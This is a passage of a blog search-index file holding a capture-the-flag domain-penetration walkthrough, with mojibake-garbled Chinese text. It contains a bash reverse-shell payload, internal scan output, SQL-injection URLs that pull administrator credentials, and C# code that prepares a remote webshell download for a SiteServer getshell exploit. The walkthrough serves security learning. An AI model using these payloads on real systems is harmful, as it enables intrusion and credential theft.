<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Penetration | 2021 DozerCTF åŸŸæ¸—é€ Workthrough</title>
      <link href="2021/06/20/Penetration_2021DozerCTF/"/>
      <url>2021/06/20/Penetration_2021DozerCTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼š<a href="https://xz.aliyun.com/t/9738">https://xz.aliyun.com/t/9738</a></p></blockquote><blockquote><p><strong>æœ¬æ–‡æ‰€æ¶‰åŠçš„å†…å®¹ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ ç ”ç©¶ä½¿ç”¨ï¼Œä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</strong></p></blockquote><h2 id="0x00-å¼•è¨€"><a href="#0x00-å¼•è¨€" class="headerlink" title="0x00 å¼•è¨€"></a>0x00 å¼•è¨€</h2><p>äº”æœˆåº•æœ‰ä¸ª DozerCTFï¼Œæ¯”èµ›æ—¶é—´å’Œ XCTF Finalã€DASCTF ç­‰å‡ ä¸ªæ¯”èµ›å†²çªäº†ï¼Œäºæ˜¯å½“æ—¶è¿™ä¸ªæ¯”èµ›å°±åŸºæœ¬æ²¡çœ‹äº†ã€‚</p><p>ä¸è¿‡é‡Œé¢æœ‰ä¸ªåŸŸæ¸—é€çš„é¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œæ­£å¥½å’±è¿˜æ²¡ç©è¿‡åŸŸæ¸—é€ï¼Œè¶è¿™ä¸ªæœºä¼šå°±æ¥å­¦ä¸€ä¸‹ç›¸å…³çš„çŸ¥è¯†ï¼Œæ¥ç»ƒç»ƒæ‰‹ã€‚</p><blockquote><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>ç›®æ ‡äººç‰©flagï¼Œæ¨¡æ‹Ÿä¸€æ¬¡çº¢é˜Ÿè¡ŒåŠ¨å§ã€‚ </p><p><a href="http://web1.dozer.team:8082/">http://web1.dozer.team:8082/</a></p><p><em>ï¼ˆè¿™ç¯‡æ–‡ç« å‘å‡ºæ¥çš„æ—¶å€™ç¯å¢ƒå·²ç»å…³äº†ï¼‰</em></p></blockquote><p>ç”±äºæœ€è¿‘æ¯”è¾ƒå¿™ï¼Œè¿™é¢˜åœ¨æ¯”èµ›çš„æ—¶å€™æ²¡æ€ä¹ˆæ‰“ï¼Œå¤§éƒ¨åˆ†æ˜¯ä¹‹åå¤ç°çš„ï¼Œé¢˜ç›®ç¯å¢ƒé‡ç½®äº†å¥½å‡ æ¬¡ï¼Œç„¶è€Œå¤ç°çš„æ—¶å€™åŸŸç¯å¢ƒè¿˜æ˜¯è¢«å¸ˆå‚…ä»¬æ‰“çƒ‚äº†ã€‚</p><p>äºæ˜¯è¿™ç¯‡æ–‡ç« å°±ç®—æ˜¯ä¸ªæ¸—é€è¿‡ç¨‹çš„è®°å½•å§ï¼Œæ–­æ–­ç»­ç»­å†™çš„ï¼Œè¿‡ç¨‹ä¸­ç”±äºç¯å¢ƒé‡ç½®æˆ–è€… shell ä¸ç¨³å®šçš„åŸå› å¯¼è‡´é‡æ–°æ‰“äº†å¥½å‡ æ¬¡ï¼Œå‰åä¼šæœ‰äº›ä¸è¿ç»­ï¼Œæ“ä½œä¹Ÿä¸ç†Ÿæ‚‰ï¼Œå†™çš„ä¹Ÿæ¯”è¾ƒä¹±ï¼Œå¸ˆå‚…ä»¬éšæ„çœ‹çœ‹å°±å¥½äº†ã€‚Orz</p><h2 id="0x01-10-10-1-47-LightCMS"><a href="#0x01-10-10-1-47-LightCMS" class="headerlink" title="0x01 10.10.1.47 LightCMS"></a>0x01 10.10.1.47 LightCMS</h2><p>å…¥å£æ˜¯ <a href="https://github.com/eddy8/LightCMS">LightCMS</a></p><p>åå°ç™»å½•ä¿¡æ¯ç¾¤é‡Œå·²ç»ç»™äº†</p><p>å³ dozer / dozer123 </p><blockquote><p>å‚è€ƒï¼š</p><p>gml éƒ­é™¢å£«çš„ <a href="https://igml.top/2021/05/10/lightcms-RCE/">lightcmsåå°RCEæ¼æ´æŒ–æ˜</a></p><p>Ying å¸ˆå‚…çš„ <a href="https://www.gem-love.com/websecurity/2763.html">LightCMSå…¨ç‰ˆæœ¬åå°RCE 0dayåˆ†æ</a></p><p><a href="https://xz.aliyun.com/t/9561">LightCMS æ–‡ä»¶ä¸Šä¼ &amp;&amp;pharååºåˆ—åŒ–rceæ¼æ´å¤ç°</a></p><p><a href="https://www.freebuf.com/vuls/264662.html">å†è°ˆLaravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰æ¼æ´</a></p><p>GitHub: <a href="https://github.com/ambionics/phpggc">PHPGGC: PHP Generic Gadget Chains</a></p></blockquote><p>ç„¶è€Œå½“æ—¶ç”¨è¿™ä¸ªååºåˆ—åŒ–çš„æ´æ‰“ä¸é€šâ€¦â€¦æœ€åæ¢äº†ä¸ªæ‰“æ³•ã€‚</p><p>åœ¨ <code>/admin/neditor/serve/catchimage</code> æ¥å£å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥è¯»å– <code>/var/www/html/app/Http/Controllers/Admin/NEditorController.php</code> æ–‡ä»¶ã€‚</p><p>å‘ç° <code>/admin/neditor/serve/testInclude</code> è¿™ä¸ªè·¯ç”±ä¸‹å¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤ã€‚</p><p>é¦–å…ˆåœ¨å†…å®¹ç®¡ç†-æ–‡ç« è¿™é‡Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210530232859646.png"></p><p>ç„¶ååœ¨è¿™ä¸ªè·¯ç”±ä¸‹æ‰§è¡Œï¼Œæ¯”å¦‚ï¼š</p><pre class="language-none"><code class="language-none">1=system('bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1');&amp;file=./upload/image/202105/iAWvVAZTHl35fVW29B5zk6iLh6G7K5tDQXL0PaX9.gif</code></pre><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210530232538785.png"></p><p>åœ¨ vps ä¸Šå°±èƒ½æ‹¿åˆ° shellï¼Œè¿›è€Œåœ¨æ ¹ç›®å½•ä¸‹æ‹¿åˆ°ç¬¬ä¸€ä¸ª flag äº†ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531004154983.png"></p><blockquote><p>è¿™é‡Œå…¶å®æœ‰ä¸ªéé¢„æœŸï¼Œç³»ç»Ÿç®¡ç†ä¸‹æœ‰ä¸ªæ—¥å¿—çš„è®°å½•ï¼Œå¯ä»¥ç›´æ¥è¹­ä¹‹å‰å¸ˆå‚…çš„å°è½¦è½¦ï¼ŒçŸ¥é“äº† flag åœ¨ <code>/flag_d0z3r</code> ã€‚</p><p>åœ¨ <code>catchimage</code> æ¥å£ç›´æ¥è®¿é—®å“åº”é‡Œçš„ urlï¼Œå†…å®¹å°±æ˜¯ flagã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210530232415089.png"></p></blockquote><h3 id="æœé›†å†…ç½‘ä¿¡æ¯"><a href="#æœé›†å†…ç½‘ä¿¡æ¯" class="headerlink" title="æœé›†å†…ç½‘ä¿¡æ¯"></a>æœé›†å†…ç½‘ä¿¡æ¯</h3><p><code>ifconfig</code></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210530233207356.png"></p><p>é¡ºä¾¿å‘ç°ä»–ç”¨çš„ lightcms ç‰ˆæœ¬æ˜¯ 1.3.5</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531014255806.png"></p><p>é¡ºä¾¿çœ‹ä¸‹é…ç½®æ–‡ä»¶ã€‚</p><p><code>/var/www/html/config/database.php</code></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210603042057566.png"></p><p><code>env</code> çœ‹ä¸‹ç¯å¢ƒå˜é‡ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210603042321797.png" alt="ç¯å¢ƒå˜é‡"></p><p>äºæ˜¯çŸ¥é“äº†æ•°æ®åº“æ˜¯ MySQLï¼Œç”¨æˆ·å/å¯†ç å‡ä¸º <code>user1</code>.</p><p><em>ï¼ˆç™»ä¸Šå»çœ‹äº†çœ‹ï¼Œè²Œä¼¼æ²¡å•¥ç”¨</em></p><p>æ‰”ä¸ª kscan ä¸Šå»ï¼Œæ‰«ä¸€æ³¢å†…ç½‘ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>ssh://10.10.1.47:22  <span class="token number">42</span>      SSH-2.0-Op      Product:OpenSSH,Version:7.2p2 Ubuntu 4ubuntu2.10,OS:Linux,DeviceType:Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span>,OtherInfo:Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>microsoft-ds://10.10.1.1:445 <span class="token number">103</span>     cï¿½SMBrProduct:Microsoft Windows Server <span class="token number">2008</span> R2 - <span class="token number">2012</span> microsoft-ds,OS:Windows,HostName:DC01,DeviceType:workgroup: DOZER,OtherInfo:workgroup: DOZER<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>microsoft-ds://10.10.1.234:445       <span class="token number">133</span>     ï¿½ï¿½SMBr  Product:Microsoft Windows Server <span class="token number">2008</span> R2 - <span class="token number">2012</span> microsoft-ds,OS:Windows Server <span class="token number">2008</span> R2 - <span class="token number">2012</span><span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>microsoft-ds://10.10.1.231:445       <span class="token number">117</span>     qï¿½SMBrProduct:Microsoft Windows Server <span class="token number">2008</span> R2 - <span class="token number">2012</span> microsoft-ds,OS:Windows Server <span class="token number">2008</span> R2 - <span class="token number">2012</span><span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>microsoft-ds://10.10.1.250:445       <span class="token number">105</span>     eï¿½SMBrProduct:Microsoft Windows Server <span class="token number">2008</span> R2 - <span class="token number">2012</span> microsoft-ds,OS:Windows Server <span class="token number">2008</span> R2 - <span class="token number">2012</span><span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>https://10.10.1.231:3389     <span class="token number">512</span>     QM`ï¿½ï¿½N<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>http://10.10.1.47:80 <span class="token number">200</span>     Laravel Product:nginx,Version:1.10.3,OS:Linux,DeviceType:Ubuntu,OtherInfo:Ubuntu,server:nginx/1.10.3 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>,ä½¿ç”¨å¯ä»¥åˆ é™¤ç›¸å…³è·¯ç”±ï¼ˆroutes/web.phpã€rout<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>http://10.10.1.100:80        <span class="token number">403</span>     HTTP/1.1 <span class="token number">4</span>      Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>http://10.10.1.122:80        <span class="token number">200</span>     Apache2UbuntuDefaultPage:Itworks        Product:Apache httpd,Version:2.4.18,DeviceType:<span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>,OtherInfo:<span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>,server:Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>,rticularconfigurationsnippetsw<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>http://10.10.1.231:80        <span class="token number">404</span>     HTTP/1.1 <span class="token number">4</span>      Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>http://10.10.1.234:80        <span class="token number">200</span>     HTTP/1.1 <span class="token number">2</span>      Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>http://10.10.1.100:81        <span class="token number">403</span>     <span class="token number">403</span>-ç¦æ­¢è®¿é—®:è®¿é—®è¢«æ‹’ç»ã€‚       Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0,:è®¿é—®è¢«æ‹’ç»ã€‚æœåŠ¡å™¨é”™è¯¯403-ç¦æ­¢è®¿é—®:è®¿é—®è¢«æ‹’ç»ã€‚æ‚¨æ— æƒ<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>http://10.10.1.250:80        <span class="token number">200</span>     DozerCTF2021â€“åˆä¸€ä¸ªWordPressç«™ç‚¹        Product:Apache httpd,Version:2.4.39,DeviceType:<span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,OtherInfo:<span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,server:Apache/2.4.39 <span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,RSSWordPress.orgDozerCTF2021,è‡ª<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>mysql://10.10.1.250:3306     <span class="token number">71</span>      Cï¿½jHost         Product:MySQL,DeviceType:unauthorized,OtherInfo:unauthorized<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>http://10.10.1.122:8888      <span class="token number">200</span>     Directorylistingfor/    Product:SimpleHTTPServer,Version:0.6,DeviceType:Python <span class="token number">3.5</span>.2,OtherInfo:Python <span class="token number">3.5</span>.2,server:SimpleHTTP/0.6 Python/3.5.2,ldNZOmxkq3769/ctLoSsHXtMKzmiPz<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>http://10.10.1.122:9999      <span class="token number">200</span>     Directorylistingfor/    Product:SimpleHTTPServer,Version:0.6,DeviceType:Python <span class="token number">3.5</span>.2,OtherInfo:Python <span class="token number">3.5</span>.2,server:SimpleHTTP/0.6 Python/3.5.2,private-84758d0d58d44984879202<span class="token punctuation">[</span>âˆš<span class="token punctuation">]</span>https://10.10.1.100:443      <span class="token number">200</span>     Outlook Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0,94jMMZwmJD5JAhCfWPm0e2+MGKDYRQ,CN<span class="token operator">=</span>exch</code></pre><p>å¤§æ¦‚åŒ…æ‹¬ï¼š</p><ul><li>10.10.1.1 åŸŸæ§</li><li><a href="http://10.10.1.47/">http://10.10.1.47</a> æœ¬æœº</li><li><a href="https://10.10.1.100/">https://10.10.1.100:443</a>  Outlook Exchange</li><li><a href="http://10.10.1.122/">http://10.10.1.122</a> ä¸€ä¸ª web æœåŠ¡å™¨ Apache httpd</li><li><a href="http://10.10.1.231/">http://10.10.1.231</a> å¦ä¸€ä¸ª web æœåŠ¡å™¨ IIS</li><li><a href="http://10.10.1.234/">http://10.10.1.234</a> web æœåŠ¡å™¨ IIS</li><li><a href="http://10.10.1.250/">http://10.10.1.250/</a>  wordpress</li></ul><p>è¿™é‡Œä¹‹åå¤ç°çš„æ—¶å€™æ•´ä¸ªåŸŸç¯å¢ƒéƒ½é‡ç½®äº†ï¼Œä¸¢äº†ä¸ª fscan ä¸Šå»é‡æ–°æ‰«äº†ä¸€æ³¢ã€‚</p><p>ï¼ˆè¿˜æ˜¯ fscan çœ‹èµ·æ¥æ›´èˆ’æœä¸€ç‚¹</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ./fscan -h 10.10.1.1/24</span><span class="token number">10.10</span>.1.1:139 <span class="token function">open</span><span class="token number">10.10</span>.1.231:139 <span class="token function">open</span><span class="token number">10.10</span>.1.234:139 <span class="token function">open</span><span class="token number">10.10</span>.1.250:139 <span class="token function">open</span><span class="token number">10.10</span>.1.121:139 <span class="token function">open</span><span class="token number">10.10</span>.1.250:135 <span class="token function">open</span><span class="token number">10.10</span>.1.234:135 <span class="token function">open</span><span class="token number">10.10</span>.1.121:135 <span class="token function">open</span><span class="token number">10.10</span>.1.1:135 <span class="token function">open</span><span class="token number">10.10</span>.1.47:22 <span class="token function">open</span><span class="token number">10.10</span>.1.231:135 <span class="token function">open</span><span class="token number">10.10</span>.1.100:81 <span class="token function">open</span><span class="token number">10.10</span>.1.250:80 <span class="token function">open</span><span class="token number">10.10</span>.1.234:80 <span class="token function">open</span><span class="token number">10.10</span>.1.231:80 <span class="token function">open</span><span class="token number">10.10</span>.1.122:80 <span class="token function">open</span><span class="token number">10.10</span>.1.100:443 <span class="token function">open</span><span class="token number">10.10</span>.1.100:808 <span class="token function">open</span><span class="token number">10.10</span>.1.250:3306 <span class="token function">open</span><span class="token number">10.10</span>.1.231:1433 <span class="token function">open</span><span class="token number">10.10</span>.1.231:445 <span class="token function">open</span><span class="token number">10.10</span>.1.234:445 <span class="token function">open</span><span class="token number">10.10</span>.1.250:445 <span class="token function">open</span><span class="token number">10.10</span>.1.121:445 <span class="token function">open</span><span class="token number">10.10</span>.1.1:445 <span class="token function">open</span><span class="token number">10.10</span>.1.122:1080 <span class="token function">open</span><span class="token number">10.10</span>.1.100:80 <span class="token function">open</span><span class="token number">10.10</span>.1.47:80 <span class="token function">open</span><span class="token number">10.10</span>.1.122:8000 <span class="token function">open</span><span class="token number">10.10</span>.1.122:9000 <span class="token function">open</span><span class="token number">10.10</span>.1.122:8080 <span class="token function">open</span><span class="token number">10.10</span>.1.100:8172 <span class="token function">open</span><span class="token number">10.10</span>.1.122:9096 <span class="token function">open</span><span class="token number">10.10</span>.1.122:9090 <span class="token function">open</span><span class="token number">10.10</span>.1.122:10010 <span class="token function">open</span><span class="token number">10.10</span>.1.1:88 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.1.121          DOZER<span class="token punctuation">\</span>DESKTOP-ALICE     Windows Server <span class="token number">2012</span> Datacenter <span class="token number">9200</span>NetInfo:<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">10.10</span>.1.121   <span class="token punctuation">[</span>-<span class="token operator">&gt;</span><span class="token punctuation">]</span>Deskto-Alice   <span class="token punctuation">[</span>-<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token number">10.10</span>.1.121NetInfo:<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">10.10</span>.1.1   <span class="token punctuation">[</span>-<span class="token operator">&gt;</span><span class="token punctuation">]</span>dc01   <span class="token punctuation">[</span>-<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token number">10.10</span>.1.1NetInfo:<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">10.10</span>.1.234   <span class="token punctuation">[</span>-<span class="token operator">&gt;</span><span class="token punctuation">]</span>WIN-UIARPOTP0AL   <span class="token punctuation">[</span>-<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token number">10.10</span>.1.234<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.1.1      <span class="token punctuation">[</span>+<span class="token punctuation">]</span>DC DOZER<span class="token punctuation">\</span>DC01              Windows Server <span class="token number">2012</span> Standard <span class="token number">9200</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.1.234          WORKGROUP<span class="token punctuation">\</span>WIN-UIARPOTP0AL   Windows Server <span class="token number">2012</span> Datacenter <span class="token number">9200</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.1.1  <span class="token punctuation">(</span>Windows Server <span class="token number">2012</span> Standard <span class="token number">9200</span><span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.1.231          DOZER<span class="token punctuation">\</span>SQLSERVER14       Windows Server <span class="token number">2012</span> Standard <span class="token number">9200</span>NetInfo:<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">10.10</span>.1.231   <span class="token punctuation">[</span>-<span class="token operator">&gt;</span><span class="token punctuation">]</span>Sqlserver14   <span class="token punctuation">[</span>-<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token number">10.10</span>.1.231<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:http://10.10.1.100        code:403 len:0      title:None<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:http://10.10.1.47         code:200 len:7      title:Laravel<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:http://10.10.1.100:81     code:403 len:1157   title:403 - ç¦æ­¢è®¿é—®: è®¿é—®è¢«æ‹’ç»ã€‚<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:https://10.10.1.100       code:302 len:0      title:None<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:http://10.10.1.122        code:200 len:37     title:Apache2 Ubuntu Default Page: It works<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:http://10.10.1.231        code:404 len:0      title:NoneNetInfo:<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">10.10</span>.1.250   <span class="token punctuation">[</span>-<span class="token operator">&gt;</span><span class="token punctuation">]</span>web02   <span class="token punctuation">[</span>-<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token number">10.10</span>.1.250<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.1.250          DOZER<span class="token punctuation">\</span>WEB02             Windows Server <span class="token number">2012</span> Standard <span class="token number">9200</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:http://10.10.1.122:8080   code:200 len:10795  title:DozerCTF <span class="token number">2021</span> <span class="token operator">&amp;</span><span class="token comment">#8211; åˆä¸€ä¸ªWordPressç«™ç‚¹</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:http://10.10.1.122:9000   code:200 len:11321  title:Apache2 Ubuntu Default Page: It works<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:https://10.10.1.100/owa/  code:200 len:28240  title:Outlook<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:http://10.10.1.234        code:200 len:171    title:None<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle:http://10.10.1.250        code:200 len:46     title:DozerCTF <span class="token number">2021</span> <span class="token operator">&amp;</span><span class="token comment">#8211; åˆä¸€ä¸ªWordPressç«™ç‚¹</span></code></pre><p>å™¢è¿˜æ¼äº†ä¸ª 10.10.1.121 DOZER\DESKTOP-ALICEï¼Œä¸Šé¢è¯´ä¸å®šè¿˜æœ‰åŸŸç®¡çš„ hashã€‚</p><p>åœ¨ 10.10.1.47 ä¸Šç”¨ frp / iox ä¹‹ç±»çš„å¼€ä¸ª socks ä»£ç†åˆ°è‡ªå·±çš„ vpsï¼Œç„¶åå†è½¬å‘åˆ°æœ¬åœ°ï¼Œè¿™æ ·å°±èƒ½ç›´æ¥ä»æœ¬åœ°è¿åˆ°å†…ç½‘é‡Œäº†ã€‚</p><p>Linux ä¸‹ç›´æ¥åœ¨ proxychains é‡Œé…å¥½ socks è¿æ¥ï¼Œè€Œåæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ç›´æ¥ <code>proxychains è¦æ‰§è¡Œçš„å‘½ä»¤</code> å°±å®Œäº‹äº†ã€‚</p><blockquote><p>å¯ä»¥å‚è€ƒ</p><p><a href="https://www.freebuf.com/articles/web/170970.html">å†…ç½‘æ¸—é€ä¹‹ç«¯å£è½¬å‘ä¸ä»£ç†å·¥å…·æ€»ç»“</a></p></blockquote><h2 id="0x02-10-10-1-234-SiteServer"><a href="#0x02-10-10-1-234-SiteServer" class="headerlink" title="0x02 10.10.1.234 SiteServer"></a>0x02 10.10.1.234 SiteServer</h2><blockquote><p>Hint:</p><p>æœ‰ä¸€æ¬¡ï¼Œè¿ç»´äººå‘˜åœ¨åƒé¥­çš„æ—¶å€™æåˆ°äº†ä»–ä»¬ç”¨äº†siteserver</p></blockquote><p>ç›´æ¥è®¿é—® <a href="http://10.10.1.234/">http://10.10.1.234/</a> å¾—åˆ°</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> $pageInfo <span class="token operator">=</span> <span class="token punctuation">{</span>publishmentSystemID <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> channelID <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> contentID <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> siteUrl <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span> homeUrl <span class="token operator">:</span> <span class="token string">"/home"</span><span class="token punctuation">,</span> currentUrl <span class="token operator">:</span> <span class="token string">"/"</span><span class="token punctuation">,</span> rootUrl <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span> apiUrl <span class="token operator">:</span> <span class="token string">"/api"</span><span class="token punctuation">}</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><p>åˆ©ç”¨æŠ¥é”™ï¼Œå‘ç°äº†ä»–ç›®å½•æ˜¯ <code>/siteserver/</code></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210530233827643.png"></p><p>è¿›è€Œå‘ç°æ˜¯ä¸ª siteserver</p><p>ç™»å½•é¡µé¢ï¼š</p><p><a href="http://10.10.1.234/siteserver/login.aspx">http://10.10.1.234/siteserver/login.aspx</a></p><p>å‚è€ƒ <a href="http://www.52bug.cn/hkjs/6704.html">æº¯æºå¤ç°SiteServer5ç–‘ä¼¼åœ¨é‡0day</a></p><p>å¯ä»¥åˆ†åˆ«æ‹¿åˆ° UserNameã€Passwordã€PasswordSaltã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210530234810893.png" alt="username"></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210530234756127.png" alt="password"></p><pre class="language-none"><code class="language-none">http://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20Username%20from%20bairong_Administrator--Adminhttp://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%201%20Password%20from%20bairong_Administrator--leonsechttp://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20PasswordSalt%20from%20bairong_Administrator--D79FHgmyyy5RH7WnljqNBQ==</code></pre><p><em>ï¼ˆä¸è¿‡è²Œä¼¼æ²¡å•¥ç”¨</em></p><p>ç„¶åæŸ¥ä¸€æŸ¥ SiteServer æœ‰å•¥æ¼æ´ï¼Œæœç„¶å°±æœ‰ç°æˆçš„ã€‚</p><blockquote><p><a href="https://www.freebuf.com/articles/web/195105.html">ç®€è®°é‡ç”Ÿåº”æ€¥æ•è·åˆ°çš„siteserverè¿œç¨‹æ¨¡æ¿ä¸‹è½½Getshellæ¼æ´</a> </p><p><a href="https://www.cnblogs.com/0x28/p/14380457.html">SiteServer CMS 5.x æ¼æ´å¤ç°&amp;åˆ†æ</a></p><p><a href="https://github.com/zhaoweiho/SiteServer-CMS-Remote-download-Getshell">https://github.com/zhaoweiho/SiteServer-CMS-Remote-download-Getshell</a></p></blockquote><p>å‘ç°ç›´æ¥æ‰“è¿‡å»æ— æ³•è®¿é—®ï¼Œå™¢ GitHub å•Šï¼Œæ²¡äº‹äº†ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531001036208.png"></p><p>é‚£è¯•è¯• fastgit çš„ä»£ç†ã€‚</p><p>é¦–å…ˆæŒ‰ç…§ README çš„è¯´æ˜ï¼ŒæŠŠ downloadurl ç»™æ¢æ‰ã€‚</p><p>æ‡’å¾—é… C# ç¯å¢ƒäº†ï¼Œç›´æ¥æ‰¾äº†ä¸ªåœ¨çº¿çš„æ‰§è¡Œå°±å®Œäº‹äº†ã€‚</p><p><a href="http://www.dooccn.com/csharp/">http://www.dooccn.com/csharp/</a></p><pre class="language-c#" data-language="c#"><code class="language-c#">using System; using System.IO; using System.Security.Cryptography; using System.Text; namespace EncryptApplication { class Encrypt     { static void Main(string[] args)       {         var _encryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";         var _decryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";        var _inputString = "https://raw.fastgit.org/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/webshell/poxteam.zip";        var _outString = ""; var _noteMessage = "";        byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };        try{            var byKey = Encoding.UTF8.GetBytes(_encryptKey.Length &gt; 8 ? _encryptKey.Substring(0, 8) : _encryptKey);           var des = new DESCryptoServiceProvider();           var inputByteArray = Encoding.UTF8.GetBytes(_inputString);           var ms = new MemoryStream();           var cs = new CryptoStream(ms, des.CreateEncryptor(byKey, iv), CryptoStreamMode.Write);     cs.Write(inputByteArray, 0, inputByteArray.Length);         